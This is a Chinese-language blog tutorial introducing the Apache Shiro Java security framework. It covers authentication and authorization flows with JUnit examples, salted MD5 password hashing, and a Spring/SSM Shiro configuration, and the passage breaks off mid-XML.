<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/03/Shiro安全框架入门/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/03/Shiro安全框架入门/" itemprop="url">Shiro安全框架入门</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-03T08:15:41+08:00">
                2019-03-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>在针对那个SSM项目的漏洞未授权漏洞进行修复时,搜到了这个Shiro,特找资料学习了一番,记录一波。</p>
</blockquote>
<hr>
<h1 id="Shiro安全框架入门"><a href="#Shiro安全框架入门" class="headerlink" title="Shiro安全框架入门"></a>Shiro安全框架入门</h1><h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><blockquote>
<p>Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.<br>Apache Shiro™是一个强大且易用的Java安全框架,能够用于身份验证、授权、加密和会话管理。Shiro拥有易于理解的API,您可以快速、轻松地获得任何应用程序——从最小的移动应用程序到最大的网络和企业应用程序。</p>
</blockquote>
<p>简而言之,Apache Shiro是一个Java的安全框架。</p>
<h2 id="Shiro的作用"><a href="#Shiro的作用" class="headerlink" title="Shiro的作用"></a>Shiro的作用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">验证用户身份			</span><br><span class="line">访问权限控制		</span><br><span class="line">可以响应认证,或者是Session生命周期发生的时间		</span><br><span class="line">支持单点登陆(SSO)			</span><br><span class="line">支持Remember me服务,获取用户关联信息而无需登陆</span><br></pre></td></tr></table></figure>
<h2 id="Shiro基础"><a href="#Shiro基础" class="headerlink" title="Shiro基础"></a>Shiro基础</h2><h3 id="框架图"><a href="#框架图" class="headerlink" title="框架图"></a>框架图</h3><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.18.46.25-image.png" alt="2019-03-03.18.46.25-image.png"><br>Authentication，Authorizer，SessionManager，Cryptography被开发团队称为四大应用安全基石。                </p>
<p><strong>Authentication(认证器)</strong>:对用户身份进行认证，Authenticator是一个接口，shiro提供ModularRealmAuthenticator实现类,通过其可以满足大部分需求(也可自行定义)。            </p>
<p><strong>Authorizer(授权器)</strong>:用户通过认证器认证通过,在访问功能时需要通过授权器判断当前登陆用户是否具有操作权限。            </p>
<p><strong>SessionManager</strong>:即会话管理，Shiro框架定义了一套会话管理,它不依赖于Web容器的session，所以shiro可以使用在非web应用上。            </p>
<p><strong>Cryptography</strong>:即密码管理,shiro提供了一套加密/解密的组件，方便开发</p>
<h3 id="概念层理念"><a href="#概念层理念" class="headerlink" title="概念层理念"></a>概念层理念</h3><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.18.57.27-image.png" alt="2019-03-03.18.57.27-image.png"><br>核心组件:Subject SecurityManager Realms<br><strong>Subject</strong>主体,Subject可以是一个人或一个程序或者其他–当前与软件交互的任何事件。<br><strong>SecurityManager</strong>:安全管理器，管理所有的Subject,他是shiro的核心，负责对所有的subject进行安全管理。通过SecurityManager可以完成subject的认证及授权等，实质上Security是通过Authentication进行认证,通过Authorizer进行授权,通过SessionManager进行会话管理。<strong>SecurityManager是一个接口</strong>,继承了<code>Authenticator,Authorizer,SessionManager</code>这三个接口。<br><strong>Realm</strong>:用于进行权限信息的验证,我们自己实现。Realm本质上是一个特定的安全DAO:它封装与数据库连接的细节,得到Shiro所需的相关数据。在配置Shiro的时候，必须指定至少一个Realm来实现认证和授权。在自定义的Realm中,我们需要实现Realm的Authentication(身份验证) 和 Authorization(授权访问控制)，用于对用户进行的操作授权。</p>
<p><strong>Shiro不会去维护用户、维护权限；这些需要我们自己去设计/提供；然后通过相应的接口注入给Shiro即可。</strong><br>最简单的Shiro Demo：<br>1、应用代码通过Subject来进行认证和授权，而Subject又委托给SecurityManager；<br>2、我们需要给Shiro的SecurityManager注入Realm，从而让SecurityManager能得到合法的用户及其权限进行判断。<br>从上我们可以看出，Shiro不提供认证和授权，而是通过Realm让开发人员自己注入。    </p>
<h2 id="Shiro认证过程"><a href="#Shiro认证过程" class="headerlink" title="Shiro认证过程"></a>Shiro认证过程</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.15.31.00-image.png" alt="2019-03-03.15.31.00-image.png"></p>
<p>代码理解:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.SimpleAccountRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">public class AuthenticationTest &#123;</span><br><span class="line"></span><br><span class="line">    SimpleAccountRealm accountRealm = new SimpleAccountRealm();;</span><br><span class="line"></span><br><span class="line">    @Before</span><br><span class="line">    public void addUser()&#123;</span><br><span class="line">        accountRealm.addAccount(&quot;test&quot;,&quot;123456&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void testAuthentication()&#123;</span><br><span class="line">        //1.构建DefaultSecurityManager环境</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(accountRealm);</span><br><span class="line"></span><br><span class="line">        //2.主体提交认证请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;test&quot;,&quot;123456&quot;);</span><br><span class="line">        subject.login(token);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;isAuthenticated:&quot;+subject.isAuthenticated());</span><br><span class="line"></span><br><span class="line">        subject.logout();</span><br><span class="line">	 System.out.println(&quot;isAuthenticated:&quot;+subject.isAuthenticated());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>结果:依次输出isAuthenticated:true与isAuthenticated:false</strong>（表示认证成功与认证失败）。                </p>
<p>再抛出一张图方便理解:            </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.19.31.13-image.png" alt="2019-03-03.19.31.13-image.png"><br>1.调用Subject.login(token)进行登陆,会自动委托给Security Manager，调用之前必须通过<code>SecurityUtils.setSecurityManager()</code>设置;<br>2.SecurityManager负责真正的业务逻辑处理,它会委托Authenticator进行身份认证。(通过跟进login()方法即了解)<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.42.14-image.png" alt="2019-03-03.20.42.14-image.png"><br>3.Authenticator才是真正的身份验证者,Shiro Api中核心的身份认证入口点,此处可定义插入自己的实现。<br>4.Authenticator 可能会委托给相应的 AuthenticationStrategy 进行多 Realm 身份验证，默认 ModularRealmAuthenticator 会调用 AuthenticationStrategy 进行多 Realm 身份验证<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.44.01-image.png" alt="2019-03-03.20.44.01-image.png"><br>5.Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问</p>
<h2 id="Shiro授权过程"><a href="#Shiro授权过程" class="headerlink" title="Shiro授权过程"></a>Shiro授权过程</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.02.08-image.png" alt="2019-03-03.20.02.08-image.png"></p>
<blockquote>
<p><strong>在登录成功后，根据用户id获取到该用户的权限，并把权限保存在安全管理器之中，当用户访问的时候，会从管理器中判断该用户是否有权限去访问该url。</strong></p>
</blockquote>
<p>代码理解:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.SimpleAccountRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">public class AuthenticationTest &#123;</span><br><span class="line"></span><br><span class="line">    SimpleAccountRealm accountRealm = new SimpleAccountRealm();;</span><br><span class="line"></span><br><span class="line">    @Before</span><br><span class="line">    public void addUser()&#123;</span><br><span class="line">        accountRealm.addAccount(&quot;test&quot;,&quot;123456&quot;,&quot;admin&quot;,&quot;user&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void testAuthentication()&#123;</span><br><span class="line">        //1.构建DefaultSecurityManager环境</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(accountRealm);</span><br><span class="line"></span><br><span class="line">        //2.主体提交认证请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();//获取当前主体</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;test&quot;,&quot;123456&quot;);</span><br><span class="line">        subject.login(token);</span><br><span class="line"></span><br><span class="line">     System.out.println(&quot;isAuthenticated:&quot;+subject.isAuthenticated());</span><br><span class="line"></span><br><span class="line">        subject.checkRoles(&quot;admin&quot;,&quot;user&quot;);  //正确</span><br><span class="line">        //subject.checkRole(&quot;admin1&quot;);  报错</span><br><span class="line">        //subject.checkRoles(&quot;admin&quot;,&quot;user1&quot;); 报错</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行测试可看到效果。<br>执行过程与认证大体类似<br>1.调用<code>subject.checkRoles(&quot;admin&quot;,&quot;user&quot;);</code>进行角色检查,会自动委托给Security Manager，调用之前必须通过<code>SecurityUtils.setSecurityManager()</code>设置<br>2.SecurityManager执行授权，通过ModularRealmAuthorizer执行授权<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.56.36-image.png" alt="2019-03-03.20.56.36-image.png"><br>3.ModularRealmAuthorizer执行DatabaseRealm从数据库查询权限数据<br>（调用DatabaseRealm的授权方法:doGetAuthorizationInfo(principalCollection)）<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.20.55.02-image.png" alt="2019-03-03.20.55.02-image.png"><br>4.DatabaseRealm从数据库中查到权限数据，返回ModularRealmAuthorizer<br>5.ModularRealmAuthorizer调用PermissionResolver进行权限比对<br>6.如果比对后，isPermitted中”permission串”在realm查询到权限数据中，说明用户访问permission串有权限，否则 没有权限，抛出异常。            </p>
<h2 id="Shiro加密"><a href="#Shiro加密" class="headerlink" title="Shiro加密"></a>Shiro加密</h2><h2 id="普通加密"><a href="#普通加密" class="headerlink" title="普通加密"></a>普通加密</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.14.33.21-image.png" alt="2019-03-02.14.33.21-image.png"><br>上面的123经过Md5加密后,得到的字符串：<br><code>202cb962ac59075b964b07152d234b70</code>就无法通过计算还原回<code>123</code>,那我们就可以把这个值存放在数据库中,当用户登陆时,先进行Md5加密,再与数据库中的密码进行比对,保证了一定的安全性。但是:<code>虽然无法通过直接计算反推到密码，但是我们仍然可以通过计算出常用的密码的Md5值,然后去对比也可以知道原密码是多少。</code>为了解决这个问题,引入了<strong>盐</strong>的概念。        </p>
<h3 id="加盐-多次加密"><a href="#加盐-多次加密" class="headerlink" title="加盐+多次加密"></a>加盐+多次加密</h3><p>既然相同的密码md5一样,我们就让我们的原始密码加上一<strong>个随机数</strong>,再进行Md5加密,这个随机数就是我们说的<strong>盐</strong>,当然我们也要把用户对应的盐放入数据库,以便我们进行验证。        另外我们也可以通过多次加密的方式,即使大黑阔通过一定手段拿到我们的密码Md5值,但他并不知道我们加密了多少次,破解门槛变高。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.15.22.20-image.png" alt="2019-03-02.15.22.20-image.png"></p>
<h2 id="SSM简单实例"><a href="#SSM简单实例" class="headerlink" title="SSM简单实例"></a>SSM简单实例</h2><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>web.xml做了几件事情:<br>1.指定Spring的配置文件<code>applicationContext.xml(连接数据库)与applicationContext-shiro.xml(配置shiro的)</code></p>
<pre><code>&lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
</code></pre><p>2.指定springmvc的配置文件：</p>
<pre><code>&lt;init-param&gt;
            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
            &lt;param-value&gt;classpath:springMVC.xml&lt;/param-value&gt;
        &lt;/init-param&gt;
</code></pre><p>3.使用shiro过滤器:        </p>
<pre><code>&lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
</code></pre><h3 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h3><p>1.配置数据库的相关信息<br>2.扫描mapper类<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.19.45-image.png" alt="2019-03-02.20.19.45-image.png"></p>
<h3 id="applicationContext-shiro-xml"><a href="#applicationContext-shiro-xml" class="headerlink" title="applicationContext-shiro.xml"></a>applicationContext-shiro.xml</h3><p>提供shiro的相关配置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">	   xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:util=&quot;http://www.springframework.org/schema/util&quot;</span><br><span class="line">	   xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">	   xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">	   xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">	   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">	http://www.springframework.org/schema/beans/spring-beans-4.0.xsd http://www.springframework.org/schema/tx</span><br><span class="line">	http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context</span><br><span class="line">	http://www.springframework.org/schema/context/spring-context-4.0.xsd http://www.springframework.org/schema/mvc</span><br><span class="line">	http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/aop</span><br><span class="line">	http://www.springframework.org/schema/aop/spring-aop-4.0.xsd http://www.springframework.org/schema/util</span><br><span class="line">	http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;!-- 配置shiro的过滤器工厂类，id- shiroFilter要和我们在web.xml中配置的过滤器一致 --&gt;</span><br><span class="line">	&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;</span><br><span class="line">		&lt;!-- 调用我们配置的权限管理器 --&gt;</span><br><span class="line">		&lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot; /&gt;</span><br><span class="line">		&lt;!-- 配置我们的登录请求地址 --&gt;</span><br><span class="line">		&lt;property name=&quot;loginUrl&quot; value=&quot;/login&quot; /&gt;</span><br><span class="line">		&lt;!-- 如果您请求的资源不再您的权限范围，则跳转到/403请求地址 --&gt;</span><br><span class="line">		&lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized&quot; /&gt;</span><br><span class="line">		&lt;!-- 退出 --&gt;</span><br><span class="line">		&lt;property name=&quot;filters&quot;&gt;</span><br><span class="line">			&lt;util:map&gt;</span><br><span class="line">				&lt;entry key=&quot;logout&quot; value-ref=&quot;logoutFilter&quot; /&gt;</span><br><span class="line">			&lt;/util:map&gt;</span><br><span class="line">		&lt;/property&gt;</span><br><span class="line">		&lt;!-- 权限配置 --&gt;</span><br><span class="line">		&lt;property name=&quot;filterChainDefinitions&quot;&gt;</span><br><span class="line">			&lt;value&gt;</span><br><span class="line">				&lt;!-- anon表示此地址不需要任何权限即可访问 --&gt;</span><br><span class="line">				/login=anon</span><br><span class="line">				/index=anon</span><br><span class="line">				/static/**=anon</span><br><span class="line">				/doLogout=logout</span><br><span class="line">				&lt;!--所有的请求(除去配置的静态资源请求或请求地址为anon的请求)都要通过登录验证,如果未登录则跳到/login --&gt;</span><br><span class="line">				/** = authc</span><br><span class="line">			&lt;/value&gt;</span><br><span class="line">		&lt;/property&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 退出过滤器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;logoutFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.LogoutFilter&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;redirectUrl&quot; value=&quot;/index&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;!-- 会话ID生成器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionIdGenerator&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.session.mgt.eis.JavaUuidSessionIdGenerator&quot; /&gt;</span><br><span class="line">	&lt;!-- 会话Cookie模板 关闭浏览器立即失效 --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionIdCookie&quot; class=&quot;org.apache.shiro.web.servlet.SimpleCookie&quot;&gt;</span><br><span class="line">		&lt;constructor-arg value=&quot;sid&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;httpOnly&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;maxAge&quot; value=&quot;-1&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 会话DAO --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionDAO&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAO&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;sessionIdGenerator&quot; ref=&quot;sessionIdGenerator&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 会话验证调度器，每30分钟执行一次验证 ，设定会话超时及保存 --&gt;</span><br><span class="line">	&lt;bean name=&quot;sessionValidationScheduler&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.session.mgt.ExecutorServiceSessionValidationScheduler&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;interval&quot; value=&quot;1800000&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 会话管理器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;sessionManager&quot;</span><br><span class="line">		  class=&quot;org.apache.shiro.web.session.mgt.DefaultWebSessionManager&quot;&gt;</span><br><span class="line">		&lt;!-- 全局会话超时时间（单位毫秒），默认30分钟 --&gt;</span><br><span class="line">		&lt;property name=&quot;globalSessionTimeout&quot; value=&quot;1800000&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;deleteInvalidSessions&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionValidationSchedulerEnabled&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionValidationScheduler&quot; ref=&quot;sessionValidationScheduler&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionDAO&quot; ref=&quot;sessionDAO&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionIdCookieEnabled&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionIdCookie&quot; ref=&quot;sessionIdCookie&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;!-- 安全管理器 --&gt;</span><br><span class="line">	&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;realm&quot; ref=&quot;databaseRealm&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;!-- 相当于调用SecurityUtils.setSecurityManager(securityManager) --&gt;</span><br><span class="line">	&lt;bean</span><br><span class="line">			class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt;</span><br><span class="line">		&lt;property 